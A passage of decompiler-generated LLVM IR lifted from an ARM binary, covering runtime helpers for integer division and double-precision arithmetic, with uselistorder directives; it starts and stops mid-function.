  %v8_1ca04 = phi i32 [ 0, %entry ], [ %v5_1ca00525, %dec_label_pc_1c9ec ], [ %v2_1c9d8, %dec_label_pc_1c9cc ], [ %v2_1c9d8, %dec_label_pc_1c9cc.dec_label_pc_1c9e0_crit_edge ]
  %v0_1c9f8 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1c9f8 = icmp slt i32 %v0_1c9f8, 0
  store i1 %v1_1c9f8, i1* %cpsr_n.global-to-local, align 1
  %v2_1c9f8 = icmp eq i32 %v0_1c9f8, 0
  store i1 %v2_1c9f8, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_1c9f8, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_1c9f8
  %v6_1ca00 = add i32 %v8_1ca04, 1
  store i32 %v6_1ca00, i32* @r0, align 4
  %v7_1ca04 = load i32, i32* %r8.global-to-local, align 4
  %v9_1ca04 = add i32 %v7_1ca04, %v8_1ca04
  %v10_1ca04 = inttoptr i32 %v9_1ca04 to i8*
  store i8 0, i8* %v10_1ca04, align 1
  %v0_1ca08.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1ca08.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1ca08.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_1c9f8, %bb
  %v2_1ca08 = phi i1 [ %v2_1ca08.pre, %bb ], [ false, %dec_label_pc_1c9f8 ]
  %v1_1ca08 = phi i1 [ %v1_1ca08.pre, %bb ], [ %v1_1c9f8, %dec_label_pc_1c9f8 ]
  %v0_1ca08 = phi i1 [ %v0_1ca08.pre, %bb ], [ %v2_1c9f8, %dec_label_pc_1c9f8 ]
  %v3_1ca08 = xor i1 %v2_1ca08, %v1_1ca08
  %v4_1ca08 = or i1 %v0_1ca08, %v3_1ca08
  br i1 %v4_1ca08, label %dec_label_pc_1ca0c, label %.dec_label_pc_1ca10_crit_edge

.dec_label_pc_1ca10_crit_edge:                    ; preds = %bb22
  %v1_1ca14.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1ca10

dec_label_pc_1ca0c:                               ; preds = %dec_label_pc_1c9c4, %dec_label_pc_1c9a0, %bb22
  br label %dec_label_pc_1ca10

dec_label_pc_1ca10:                               ; preds = %.dec_label_pc_1ca10_crit_edge, %dec_label_pc_1ca0c
  %v1_1ca14 = phi i32 [ %v1_1ca14.pre, %.dec_label_pc_1ca10_crit_edge ], [ -1, %dec_label_pc_1ca0c ]
  %v2_1ca10 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1ca10, i32* @r4, align 4
  store i32 %v6_1c96c, i32* @r5, align 4
  store i32 %v9_1c96c, i32* @r6, align 4
  ret i32 %v1_1ca14

; uselistorder directives
  uselistorder i32 %v0_1c9f8, { 0, 2, 1 }
  uselistorder i32 %v0_1c9e0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1c9d4, { 1, 0 }
  uselistorder i32 %v2_1c9c4, { 1, 0 }
  uselistorder i32 %v1_1c9b8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1c9cc, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1c99c, { 1, 0 }
  uselistorder i1 %v2_1c9e024, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i8 0, { 8, 47, 1, 2, 49, 48, 50, 3, 51, 30, 52, 10, 11, 53, 4, 54, 55, 57, 56, 33, 58, 34, 12, 60, 59, 13, 14, 15, 16, 17, 62, 61, 35, 63, 5, 64, 65, 66, 31, 32, 68, 69, 67, 71, 70, 36, 72, 18, 73, 74, 19, 75, 6, 76, 45, 77, 20, 21, 22, 23, 24, 25, 78, 79, 80, 81, 82, 37, 83, 84, 86, 87, 88, 89, 85, 26, 27, 0, 90, 91, 92, 28, 9, 94, 93, 29, 95, 96, 97, 38, 98, 99, 7, 100, 102, 39, 103, 104, 101, 105, 106, 107, 108, 110, 109, 111, 112, 113, 114, 115, 116, 117, 118, 120, 119, 122, 121, 123, 40, 125, 124, 46, 126, 41, 127, 129, 130, 128, 42, 131, 132, 44, 133, 43, 134, 135, 136, 137, 138, 139 }
  uselistorder i32 ()* @memcpy, { 18, 17, 16, 11, 10, 9, 8, 7, 6, 26, 5, 13, 25, 24, 0, 15, 14, 23, 22, 21, 12, 20, 2, 1, 19, 4, 3 }
  uselistorder i32 (i8*)* @strlen, { 14, 12, 11, 10, 9, 8, 30, 29, 13, 20, 19, 18, 31, 28, 27, 26, 24, 25, 23, 22, 21, 17, 16, 15, 34, 33, 32, 7, 6, 5, 3, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 12, 8, 7, 6, 2, 1, 0, 11, 10, 9, 19, 18, 17, 16, 15, 14, 13, 5, 4, 3 }
  uselistorder i32 46, { 0, 1, 4, 5, 6, 7, 9, 8, 2, 3 }
  uselistorder label %dec_label_pc_1ca10, { 1, 0 }
  uselistorder label %dec_label_pc_1ca0c, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1c9f8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1c9ec, { 1, 0 }
  uselistorder label %dec_label_pc_1c9a0, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_1ca18 = load i32, i32* @r1, align 4
  %v1_1ca18 = icmp slt i32 %v0_1ca18, 0
  %v2_1ca18 = icmp eq i32 %v0_1ca18, 0
  %v2_1ca1c = xor i32 %v0_1ca18, %arg1
  br i1 %v2_1ca18, label %dec_label_pc_1cb30, label %dec_label_pc_1ca24

dec_label_pc_1ca24:                               ; preds = %entry
  br i1 %v1_1ca18, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1ca24
  %v2_1ca24 = sub i32 0, %v0_1ca18
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1ca24, %bb
  %v1_1caf0 = phi i32 [ %v2_1ca24, %bb ], [ %v0_1ca18, %dec_label_pc_1ca24 ]
  %v1_1ca28 = add i32 %v1_1caf0, -1
  %v7_1ca28 = icmp eq i32 %v1_1caf0, 1
  br i1 %v7_1ca28, label %dec_label_pc_1cad0, label %dec_label_pc_1ca30

dec_label_pc_1ca30:                               ; preds = %thread-pre-split
  %v1_1ca30 = icmp slt i32 %arg1, 0
  br i1 %v1_1ca30, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1ca30
  %v2_1ca34 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1ca30, %bb85
  %v0_1cb24 = phi i32 [ %arg1, %dec_label_pc_1ca30 ], [ %v2_1ca34, %bb85 ]
  %v3_1ca38 = icmp uge i32 %v0_1cb24, %v1_1caf0
  %v9_1ca38 = icmp eq i32 %v0_1cb24, %v1_1caf0
  %v2_1ca3c = xor i1 %v3_1ca38, true
  %v3_1ca3c = or i1 %v9_1ca38, %v2_1ca3c
  br i1 %v3_1ca3c, label %dec_label_pc_1cadc, label %dec_label_pc_1ca40

dec_label_pc_1ca40:                               ; preds = %bb86
  %v2_1ca40 = and i32 %v1_1ca28, %v1_1caf0
  %v4_1ca40 = icmp eq i32 %v2_1ca40, 0
  br i1 %v4_1ca40, label %dec_label_pc_1caec, label %dec_label_pc_1ca48

dec_label_pc_1ca48:                               ; preds = %dec_label_pc_1ca40
  %v3_1ca48 = icmp ult i32 %v1_1caf0, 536870912
  br i1 %v3_1ca48, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1ca48
  %v4_1ca4c = mul i32 %v1_1caf0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1ca48, %.thread
  %v0_1ca6c.pr40.ph = phi i32 [ %v4_1ca4c, %.thread ], [ %v1_1caf0, %dec_label_pc_1ca48 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1ca48 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1ca6c.pr40 = phi i32 [ %v4_1ca60, %bb89 ], [ %v0_1ca6c.pr40.ph, %.preheader.preheader ]
  %v1_1ca64 = phi i32 [ %v4_1ca64, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1ca58 = icmp ugt i32 %v0_1ca6c.pr40, 268435455
  br i1 %v2_1ca58, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1ca6cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1ca5c = icmp ult i32 %v0_1ca6c.pr40, %v0_1cb24
  br i1 %v4_1ca5c, label %bb88, label %dec_label_pc_1ca6cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1ca60 = and i32 %v0_1ca6c.pr40, 268435456
  %v3_1ca60 = icmp eq i32 %v2_1ca60, 0
  %v4_1ca60 = mul i32 %v0_1ca6c.pr40, 16
  br i1 %v3_1ca60, label %bb89, label %dec_label_pc_1ca6c.loopexit

bb89:                                             ; preds = %bb88
  %v2_1ca64 = and i32 %v1_1ca64, 268435456
  %v3_1ca64 = icmp eq i32 %v2_1ca64, 0
  %v4_1ca64 = mul i32 %v1_1ca64, 16
  br i1 %v3_1ca64, label %.preheader, label %dec_label_pc_1ca6cthread-pre-split.loopexit.loopexit

dec_label_pc_1ca6cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1ca7852.ph = phi i32 [ %v1_1ca64, %bb87 ], [ %v4_1ca64, %bb89 ]
  %v0_1ca6c.pr42.ph = phi i32 [ %v0_1ca6c.pr40, %bb87 ], [ %v4_1ca60, %bb89 ]
  br label %dec_label_pc_1ca6cthread-pre-split.loopexit

dec_label_pc_1ca6cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1ca6cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1ca7852 = phi i32 [ %v1_1ca64, %.thread3 ], [ %v1_1ca7852.ph, %dec_label_pc_1ca6cthread-pre-split.loopexit.loopexit ]
  %v0_1ca6c.pr42 = phi i32 [ %v0_1ca6c.pr40, %.thread3 ], [ %v0_1ca6c.pr42.ph, %dec_label_pc_1ca6cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1ca6cthread-pre-split

dec_label_pc_1ca6cthread-pre-split:               ; preds = %dec_label_pc_1ca6cthread-pre-split.loopexit, %bb91
  %v1_1ca7850 = phi i32 [ %v1_1ca7852, %dec_label_pc_1ca6cthread-pre-split.loopexit ], [ %v3_1ca78, %bb91 ]
  %v2_1ca7048 = phi i32 [ %v0_1cb24, %dec_label_pc_1ca6cthread-pre-split.loopexit ], [ %v2_1ca70, %bb91 ]
  %v0_1ca6c.pr = phi i32 [ %v0_1ca6c.pr42, %dec_label_pc_1ca6cthread-pre-split.loopexit ], [ %v3_1ca74, %bb91 ]
  br label %dec_label_pc_1ca6c

dec_label_pc_1ca6c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1ca6c

dec_label_pc_1ca6c:                               ; preds = %dec_label_pc_1ca6c.loopexit, %dec_label_pc_1ca6cthread-pre-split
  %v1_1ca78 = phi i32 [ %v1_1ca7850, %dec_label_pc_1ca6cthread-pre-split ], [ %v1_1ca64, %dec_label_pc_1ca6c.loopexit ]
  %v2_1ca70 = phi i32 [ %v2_1ca7048, %dec_label_pc_1ca6cthread-pre-split ], [ %v0_1cb24, %dec_label_pc_1ca6c.loopexit ]
  %v1_1ca74 = phi i32 [ %v0_1ca6c.pr, %dec_label_pc_1ca6cthread-pre-split ], [ %v4_1ca60, %dec_label_pc_1ca6c.loopexit ]
  %v2_1ca6c = icmp slt i32 %v1_1ca74, 0
  br i1 %v2_1ca6c, label %dec_label_pc_1ca80, label %bb90

bb90:                                             ; preds = %dec_label_pc_1ca6c
  %v4_1ca70 = icmp ult i32 %v1_1ca74, %v2_1ca70
  br i1 %v4_1ca70, label %bb91, label %dec_label_pc_1ca80

bb91:                                             ; preds = %bb90
  %v3_1ca74 = mul i32 %v1_1ca74, 2
  %v2_1ca78 = icmp slt i32 %v1_1ca78, 0
  %v3_1ca78 = mul i32 %v1_1ca78, 2
  br i1 %v2_1ca78, label %dec_label_pc_1ca80, label %dec_label_pc_1ca6cthread-pre-split

dec_label_pc_1ca80:                               ; preds = %bb90, %dec_label_pc_1ca6c, %bb91
  %v2_1ca8c63 = phi i32 [ %v3_1ca78, %bb91 ], [ %v1_1ca78, %bb90 ], [ %v1_1ca78, %dec_label_pc_1ca6c ]
  %v1_1ca8455 = phi i32 [ %v3_1ca74, %bb91 ], [ %v1_1ca74, %bb90 ], [ %v1_1ca74, %dec_label_pc_1ca6c ]
  br label %dec_label_pc_1ca84

dec_label_pc_1ca84:                               ; preds = %.thread13, %dec_label_pc_1ca80
  %v1_1cab8 = phi i32 [ %v4_1cab8, %.thread13 ], [ %v2_1ca8c63, %dec_label_pc_1ca80 ]
  %v1_1ca8c = phi i32 [ %v1_1cac8, %.thread13 ], [ 0, %dec_label_pc_1ca80 ]
  %v1_1cabc = phi i32 [ %v4_1cabc, %.thread13 ], [ %v1_1ca8455, %dec_label_pc_1ca80 ]
  %v1_1ca88 = phi i32 [ %v0_1cab4, %.thread13 ], [ %v0_1cb24, %dec_label_pc_1ca80 ]
  %v3_1ca84 = icmp ult i32 %v1_1ca88, %v1_1cabc
  br i1 %v3_1ca84, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1ca84
  %v3_1ca88 = sub i32 %v1_1ca88, %v1_1cabc
  %v3_1ca8c = or i32 %v1_1ca8c, %v1_1cab8
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1ca84, %bb92
  %v1_1ca94 = phi i32 [ %v1_1ca88, %dec_label_pc_1ca84 ], [ %v3_1ca88, %bb92 ]
  %v1_1ca98 = phi i32 [ %v1_1ca8c, %dec_label_pc_1ca84 ], [ %v3_1ca8c, %bb92 ]
  %v4_1ca90 = udiv i32 %v1_1cabc, 2
  %v6_1ca90 = icmp ult i32 %v1_1ca94, %v4_1ca90
  br i1 %v6_1ca90, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1ca94 = urem i32 %v1_1cabc, 2
  %v4_1ca94 = icmp eq i32 %v3_1ca94, 0
  %v6_1ca94 = sub i32 %v1_1ca94, %v4_1ca90
  br i1 %v4_1ca94, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1ca98 = udiv i32 %v1_1cab8, 2
  %v6_1ca98 = or i32 %v1_1ca98, %v5_1ca98
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1caa0 = phi i32 [ %v6_1ca94, %bb93 ], [ %v1_1ca94, %.thread8 ], [ %v6_1ca94, %bb94 ]
  %v1_1caa4 = phi i32 [ %v1_1ca98, %bb93 ], [ %v1_1ca98, %.thread8 ], [ %v6_1ca98, %bb94 ]
  %v4_1ca9c = udiv i32 %v1_1cabc, 4
  %v6_1ca9c = icmp ult i32 %v1_1caa0, %v4_1ca9c
  br i1 %v6_1ca9c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1caa0 = and i32 %v1_1cabc, 2
  %v4_1caa0 = icmp eq i32 %v3_1caa0, 0
  %v6_1caa0 = sub i32 %v1_1caa0, %v4_1ca9c
  br i1 %v4_1caa0, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1caa4 = udiv i32 %v1_1cab8, 4
  %v6_1caa4 = or i32 %v1_1caa4, %v5_1caa4
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1caac = phi i32 [ %v6_1caa0, %bb95 ], [ %v1_1caa0, %.thread9 ], [ %v6_1caa0, %bb96 ]
  %v1_1cab0 = phi i32 [ %v1_1caa4, %bb95 ], [ %v1_1caa4, %.thread9 ], [ %v6_1caa4, %bb96 ]
  %v4_1caa8 = udiv i32 %v1_1cabc, 8
  %v6_1caa8 = icmp ult i32 %v1_1caac, %v4_1caa8
  br i1 %v6_1caa8, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1caac = and i32 %v1_1cabc, 4
  %v4_1caac = icmp eq i32 %v3_1caac, 0
  %v6_1caac = sub i32 %v1_1caac, %v4_1caa8
  br i1 %v4_1caac, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1cab0 = udiv i32 %v1_1cab8, 8
  %v6_1cab0 = or i32 %v1_1cab0, %v5_1cab0
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1cac8 = phi i32 [ %v1_1cab0, %bb97 ], [ %v1_1cab0, %.thread10 ], [ %v6_1cab0, %bb98 ]
  %v0_1cab4 = phi i32 [ %v6_1caac, %bb97 ], [ %v1_1caac, %.thread10 ], [ %v6_1caac, %bb98 ]
  %v2_1cab4 = icmp eq i32 %v0_1cab4, 0
  br i1 %v2_1cab4, label %dec_label_pc_1cac4, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1cab8, 16
  br i1 %tmp, label %dec_label_pc_1cac4, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1cab8 = udiv i32 %v1_1cab8, 16
  %v4_1cabc = udiv i32 %v1_1cabc, 16
  br label %dec_label_pc_1ca84

dec_label_pc_1cac4:                               ; preds = %thread-pre-split12, %bb99
  %v1_1cac4 = icmp slt i32 %v2_1ca1c, 0
  br i1 %v1_1cac4, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1cac4
  %v2_1cac8 = sub i32 0, %v1_1cac8
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1cad0, %dec_label_pc_1cac4, %bb100
  %v1_1cacc = phi i32 [ %v1_1cac8, %dec_label_pc_1cac4 ], [ %v2_1cac8, %bb100 ], [ %arg1, %dec_label_pc_1cad0 ], [ %v2_1cad4, %bb101 ], [ %v1_1cae880, %bb103 ], [ %v2_1cae4, %bb104 ]
  ret i32 %v1_1cacc

dec_label_pc_1cad0:                               ; preds = %thread-pre-split
  br i1 %v1_1ca18, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1cad0
  %v2_1cad4 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1cadc:                               ; preds = %bb86
  br i1 %v3_1ca38, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1cadc
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1cadc, %bb102
  %v1_1cae880 = phi i32 [ %arg1, %dec_label_pc_1cadc ], [ 0, %bb102 ]
  br i1 %v9_1ca38, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1cae0 = ashr i32 %v2_1ca1c, 31
  %v2_1cae4 = or i32 %v4_1cae0, 1
  br label %.thread16

dec_label_pc_1caec:                               ; preds = %dec_label_pc_1ca40
  %v2_1caec = icmp ugt i32 %v1_1caf0, 65535
  br i1 %v2_1caec, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1caec
  %v2_1caf0 = and i32 %v1_1caf0, 32768
  %v3_1caf0 = icmp eq i32 %v2_1caf0, 0
  %v4_1caf0 = udiv i32 %v1_1caf0, 65536
  br i1 %v3_1caf0, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1caec
  %v0_1cafc70 = phi i32 [ %v1_1caf0, %dec_label_pc_1caec ], [ %v4_1caf0, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1cb00 = phi i32 [ %v0_1cafc70, %.thread19 ], [ %v4_1caf0, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1cafc = icmp ugt i32 %v1_1cb00, 255
  br i1 %v2_1cafc, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1cb00 = and i32 %v1_1cb00, 128
  %v3_1cb00 = icmp eq i32 %v2_1cb00, 0
  %v4_1cb00 = udiv i32 %v1_1cb00, 256
  br i1 %v3_1cb00, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1cb04 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1cb10 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1cb04, %bb108 ]
  %v1_1cb0c = phi i32 [ %v1_1cb00, %bb106 ], [ %v4_1cb00, %bb107 ], [ %v4_1cb00, %bb108 ]
  %v2_1cb08 = icmp ugt i32 %v1_1cb0c, 15
  br i1 %v2_1cb08, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1cb0c = and i32 %v1_1cb0c, 8
  %v3_1cb0c = icmp eq i32 %v2_1cb0c, 0
  %v4_1cb0c = udiv i32 %v1_1cb0c, 16
  br i1 %v3_1cb0c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1cb10 = add nsw i32 %v1_1cb10, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1cb18 = phi i32 [ %v1_1cb10, %.thread20 ], [ %v1_1cb10, %bb109 ], [ %v2_1cb10, %bb110 ]
  %v5_1cb1c = phi i32 [ %v1_1cb0c, %.thread20 ], [ %v4_1cb0c, %bb109 ], [ %v4_1cb0c, %bb110 ]
  %v2_1cb14 = icmp ugt i32 %v5_1cb1c, 3
  %v7_1cb14 = icmp eq i32 %v5_1cb1c, 4
  %v2_1cb18 = xor i1 %v7_1cb14, true
  %v3_1cb18 = and i1 %v2_1cb14, %v2_1cb18
  br i1 %v3_1cb18, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1cb18 = add nsw i32 %v4_1cb18, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1cb1c = phi i32 [ %v4_1cb18, %.thread21 ], [ %v5_1cb18, %bb111 ]
  %v2_1cb1c = xor i1 %v2_1cb14, true
  %v3_1cb1c = or i1 %v7_1cb14, %v2_1cb1c
  br i1 %v3_1cb1c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1cb1c = udiv i32 %v5_1cb1c, 2
  %v9_1cb1c = add i32 %v4_1cb1c, %v8_1cb1c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1cb24 = phi i32 [ %v4_1cb1c, %bb112 ], [ %v9_1cb1c, %bb113 ]
  %v1_1cb20 = icmp slt i32 %v2_1ca1c, 0
  %v6_1cb24 = lshr i32 %v0_1cb24, %v1_1cb24
  %v2_1cb28 = sub i32 0, %v6_1cb24
  %v2_1cb28.v6_1cb24 = select i1 %v1_1cb20, i32 %v2_1cb28, i32 %v6_1cb24
  ret i32 %v2_1cb28.v6_1cb24

dec_label_pc_1cb30:                               ; preds = %entry
  %v0_1cb34 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1cb1c, { 1, 0 }
  uselistorder i1 %v7_1cb14, { 1, 0 }
  uselistorder i32 %v4_1cb0c, { 1, 0 }
  uselistorder i32 %v1_1cb0c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1cb00, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1cb00, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1caf0, { 1, 0 }
  uselistorder i32 %v0_1cab4, { 1, 0 }
  uselistorder i32 %v4_1caa8, { 1, 0 }
  uselistorder i32 %v1_1cab0, { 1, 2, 0 }
  uselistorder i32 %v4_1ca9c, { 1, 0 }
  uselistorder i32 %v1_1caa4, { 1, 2, 0 }
  uselistorder i32 %v4_1ca90, { 1, 0 }
  uselistorder i32 %v1_1ca98, { 1, 2, 0 }
  uselistorder i32 %v1_1cabc, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1ca8c, { 1, 0 }
  uselistorder i32 %v1_1cab8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1ca78, { 1, 0 }
  uselistorder i32 %v3_1ca74, { 1, 0 }
  uselistorder i32 %v1_1ca74, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1ca70, { 1, 0 }
  uselistorder i32 %v1_1ca78, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1ca64, { 1, 0 }
  uselistorder i32 %v4_1ca60, { 2, 1, 0 }
  uselistorder i32 %v1_1ca64, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1ca6c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1ca38, { 1, 0 }
  uselistorder i32 %v1_1caf0, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1ca1c, { 1, 0, 2 }
  uselistorder i32 %v0_1ca18, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1cac4, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1ca80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ca6cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1cb48 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1cb48
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_1cb60 = bitcast i64 %tmp to double
  %v9_1cb60 = fadd double %v8_1cb60, %arg1
  %v10_1cb60 = fptrunc double %v9_1cb60 to float
  %v11_1cb60 = bitcast float %v10_1cb60 to i32
  ret i32 %v11_1cb60
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1cb64 = load i32, i32* @r0, align 4
  ret i32 %v2_1cb64
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1cb68 = load i32, i32* @r4, align 4
  store i32 %v3_1cb68, i32* %stack_var_-12, align 4
  %v6_1cb68 = load i32, i32* @r5, align 4
  %v9_1cb68 = load i32, i32* @lr, align 4
  %v0_1cb6c = load i32, i32* %r1.global-to-local, align 4
  %v2_1cb6c = mul i32 %v0_1cb6c, 2
  store i32 %v2_1cb6c, i32* %r4.global-to-local, align 4
  %v0_1cb70 = load i32, i32* %r3.global-to-local, align 4
  %v2_1cb70 = mul i32 %v0_1cb70, 2
  store i32 %v2_1cb70, i32* %r5.global-to-local, align 4
  %v4_1cb74 = icmp eq i32 %v2_1cb70, %v2_1cb6c
  %v1_1cb78 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_1cb74, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1cb78 = load i32, i32* %r2.global-to-local, align 4
  %v5_1cb78 = icmp eq i32 %v2_1cb78, %v1_1cb78
  br i1 %v5_1cb78, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1cb7c = or i32 %v1_1cb78, %v2_1cb6c
  %v5_1cb7c = icmp eq i32 %v3_1cb7c, 0
  br i1 %v5_1cb7c, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_1cb80 = load i32, i32* %r2.global-to-local, align 4
  %v3_1cb80 = or i32 %v2_1cb80, %v2_1cb70
  %v5_1cb80 = icmp eq i32 %v3_1cb80, 0
  br i1 %v5_1cb80, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_1cb6c.off = add i32 %v2_1cb6c, 4194303
  %tmp = icmp ult i32 %v2_1cb6c.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1cb70.off = add i32 %v2_1cb70, 4194303
  %tmp17 = icmp ult i32 %v2_1cb70.off, 2097152
  br label %.thread3

